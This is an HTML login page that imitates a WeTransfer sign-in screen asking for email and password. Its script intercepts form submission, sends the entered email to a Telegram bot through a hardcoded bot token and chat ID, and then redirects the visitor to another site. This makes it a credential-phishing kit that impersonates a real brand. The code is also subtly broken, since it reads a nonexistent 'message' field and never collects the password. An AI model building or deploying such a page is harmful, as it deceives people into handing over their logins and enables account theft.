<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Modern Form UI</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Poppins',sans-serif;
}

body{
  background:#f3f3f3;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:25px;
}

.container{
  width:100%;
  max-width:500px;
}

.input-box{
  margin-bottom:28px;
}

.input-box label{
  display:block;
  font-size:17px;
  color:#666;
  margin-bottom:10px;
  padding-left:18px;
}

.input-box input{
  width:100%;
  height:95px;
  border:2px solid #d9d9d9;
  border-radius:32px;
  padding:0 28px;
  font-size:26px;
  background:#f8f8f8;
  outline:none;
}

.btn{
  width:100%;
  height:95px;
  border:none;
  border-radius:32px;
  background:#3d66f5;
  color:#fff;
  font-size:34px;
  font-weight:500;
  cursor:pointer;
}

.links{
  text-align:center;
  margin-top:70px;
}

.links a{
  display:block;
  margin:28px 0;
  color:#222;
  font-size:28px;
  text-decoration:underline;
}

.divider{
  display:flex;
  align-items:center;
  margin:65px 0;
  color:#aaa;
  font-size:30px;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  height:2px;
  background:#d8d8d8;
}

.divider span{
  margin:0 35px;
}

.bottom-text{
  text-align:center;
  font-size:26px;
  color:#333;
}

.bottom-text a{
  color:#222;
  text-decoration:underline;
}

@media(max-width:600px){

  .input-box input{
    height:82px;
    font-size:22px;
  }

  .btn{
    height:82px;
    font-size:28px;
  }

  .links a{
    font-size:22px;
  }

  .bottom-text{
    font-size:22px;
  }
}

</style>
</head>
<body>
<div class="wrapper">

    <div class="logo">
      WeTransfer
    </div>

    <div class="title">
      Sign In
    </div>

    <div class="subtitle">
      to continue to your WeTransfer account.
    </div>
<div class="container">

<form id="notifyForm">

<div class="input-box">
<label>Email</label>
<input type="email" id="email" placeholder="Enter email" required>
</div>

<div class="input-box">
<label>Password</label>
<input type="password" id="password" placeholder="Enter password">
</div>

<button type="submit" class="btn">
Continue
</button>

</form>

<div class="links">
<a href="#">Forgot password?</a>
<a href="#">Use a different email?</a>
</div>

<div class="divider">
<span>or</span>
</div>

<div class="bottom-text">
Receive a
<a href="#">temporary code via email</a>
</div>

</div>

<script>

document.getElementById("notifyForm").addEventListener("submit", async function(e){

  e.preventDefault();

  const email = document.getElementById("email").value;
  const messageInput = document.getElementById("message").value;

  const botToken = "8719151931:AAE9M4RyCXNwTtCeoXc4_8Tb287gD-M2aEA";
  const chatId = "7327775914";

  const message = `
New Notification

Email: ${email}
Message: ${messageInput}
`;

  try{

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
      method:"POST",
      headers:{
        "Content-Type":"application/json"
      },
      body:JSON.stringify({
        chat_id:chatId,
        text:message
      })
    });

    window.location.href = "https://nxloaded.com";

  }catch(error){

    alert("Failed to send");

  }

});

</script>

</body>
</html>
